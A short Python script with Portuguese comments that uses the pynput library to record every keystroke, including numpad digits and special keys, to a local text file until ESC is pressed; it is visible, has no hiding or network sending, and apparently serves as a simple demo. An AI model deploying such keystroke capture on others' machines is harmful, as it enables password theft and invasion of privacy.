from pynput import keyboard

ARQUIVO_LOG = "captura_teclas.txt"

def on_press(tecla):
    with open(ARQUIVO_LOG, "a", encoding="utf-8") as f:
        # Caso 1: Teclas normais (letras, números da fileira de cima, símbolos)
        if hasattr(tecla, "char") and tecla.char is not None:
            f.write(tecla.char)

        # Caso 2: Teclas numéricas do Numpad (0–9)
        elif isinstance(tecla, keyboard.KeyCode):
            if 96 <= tecla.vk <= 105:  # códigos do NumPad 0-9
                f.write(str(tecla.vk - 96))
            else:
                f.write(f"[{tecla.vk}]")  # outras teclas sem char

        # Caso 3: Teclas especiais (Enter, Shift, etc.)
        else:
            f.write(f"[{tecla}]")

def on_release(tecla):
    if tecla == keyboard.Key.esc:
        print("Encerrando captura...")
        return False

print("Captura iniciada. Pressione ESC para sair.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
